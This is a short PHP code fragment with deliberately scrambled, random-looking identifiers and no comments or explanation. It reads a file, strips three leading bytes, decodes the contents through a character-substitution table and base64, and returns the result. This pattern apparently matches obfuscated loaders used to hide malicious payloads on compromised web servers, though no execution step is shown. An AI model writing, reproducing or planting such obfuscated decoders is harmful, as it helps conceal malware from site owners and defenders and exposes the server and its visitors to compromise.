function iqyjib_ruweqawy($wovifa_ufichovysy) {
    if ($wovifa_ufichovysy == 1)
        return efybet_ymanygam();
    if ($wovifa_ufichovysy == 2)
        return kybibo_nohiquzhe();
}

function rifiqa_fypichex($wovifa_ufichovysy) {
    $ekezyl = iqyjib_ruweqawy(1);
    $hanizhy = iqyjib_ruweqawy(2);
    for ($jezado = 0; $jezado < strlen($ekezyl); $jezado++) {
        $yhugaso = substr($ekezyl, $jezado, 1);
        $ofewata = substr($hanizhy, $jezado, 1);
        $esipyn[$yhugaso] = $ofewata;
    }

    $fedifix = strtr($wovifa_ufichovysy, $esipyn);
    $fedifix = base64_decode($fedifix);

    return $fedifix;
}

function ufogig_myjerech($wovifa_ufichovysy) {
    $jinolep = array();
    if (!file_exists($wovifa_ufichovysy))
        return false;
    $vopyfab = @file_get_contents($wovifa_ufichovysy);
    if (!$vopyfab)
        return false;
    $vopyfab = substr($vopyfab, 3);
    $jinolep = rifiqa_fypichex($vopyfab);
    return $jinolep;
}
